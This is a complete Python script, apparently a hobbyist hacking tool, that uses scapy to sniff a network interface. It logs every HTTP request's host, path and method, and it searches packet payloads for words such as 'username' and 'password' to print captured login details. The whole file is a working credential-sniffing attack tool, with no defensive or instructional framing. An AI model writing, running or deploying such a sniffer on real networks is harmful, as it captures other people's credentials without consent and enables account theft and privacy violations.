import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import argparse
import sys

def options():
    parse = argparse.ArgumentParser()
    parse.add_argument('-i','--interface',dest='interface',help='Needs interface')
    options= parse.parse_args()
    if not options.interface:
        parse.error('Specify interface using -i')
    else:
        return options


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=processer)

def get_url(packet):
    return packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load= str(packet[scapy.Raw].load)
        keys= ['username','user','login','password','pass']
        for key in keys:
            if key in load:
                return load

def processer(packet):
    if packet.haslayer(HTTPRequest):
        url=get_url(packet)
        #ip = packet[IP].src.decode()
        method = packet[HTTPRequest].Method.decode()
        print(f">>HTTP request:{url} with {method} method\n")
        login=get_login(packet)
        if login:
            print(f'\nPossible login details {login}')

options=options()
sniffer(options.interface)
